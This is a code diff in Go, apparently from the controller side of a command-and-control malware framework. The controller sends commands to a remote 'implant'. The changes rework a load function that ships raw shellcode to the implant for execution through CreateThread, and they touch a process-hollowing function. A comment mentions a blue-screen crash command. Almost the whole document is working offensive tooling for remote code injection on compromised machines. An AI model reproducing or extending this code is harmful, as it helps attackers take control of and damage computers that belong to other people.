@@ -36,10 +36,10 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 			read_len, err := (*conn).Read(request)
 			if read_len == 0 {
 				fmt.Println("Read Length is 0")
-				os.Exit(0)
+				return
 			}
 			if err != nil {
-				os.Exit(0)
+				return
 			}
 			reply := string(request[:read_len])
 			fmt.Println(reply)
@@ -110,17 +110,6 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 // 	(*conn).Write(contents)
 // }
 
-func load(conn *net.Conn, fileWShellcode string) {
-	fmt.Println("Good luck")
-	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
-	if err != nil {
-		fmt.Println("Couldn't read the file !")
-		return
-	}
-	(*conn).Write([]byte("barCode\n"))
-	(*conn).Write(file)
-}
-
 func ls(conn *net.Conn) {
 	(*conn).Write([]byte("ls\n"))
 	request := make([]byte, 99999)
@@ -164,6 +153,53 @@ func pwd(conn *net.Conn) {
 	fmt.Println()
 }
 
+func load(conn *net.Conn, fileWShellcode string) {
+	fmt.Println()
+	fmt.Println("[!]Local File Path:" + fileWShellcode)
+	file, err := os.ReadFile(fileWShellcode)
+	if err != nil {
+		fmt.Println("[-]Couldn't read the file on the local machine !")
+		return
+	}
+	fmt.Println("[*]Sending Signal ...")
+	(*conn).Write([]byte("barCode\n"))
+	buffer := make([]byte, 10000000)
+	read_len, err := (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped := buffer[:read_len]
+	bufferStr := string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Couldn't initate CreateThread")
+		return
+	}
+	fmt.Println("[+]Signal was recieved and acknowledged")
+
+	fmt.Println("[*]Sending shellcode")
+	(*conn).Write(file)
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Couldn't send the shellcode")
+	}
+	fmt.Println("[+]Shellcode sent successfully !")
+}
+
 func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	file, err := os.Stat(filePathLocal)
 	if err != nil {
@@ -205,6 +241,7 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 	bufferStr = string(bufferSnapped)
 	if bufferStr != "OK\n" {
 		fmt.Println("[-]The Remote File Does Not Exist")
+		fmt.Println()
 		return
 	}
 	fmt.Println("[+]The Remote File Exists !")
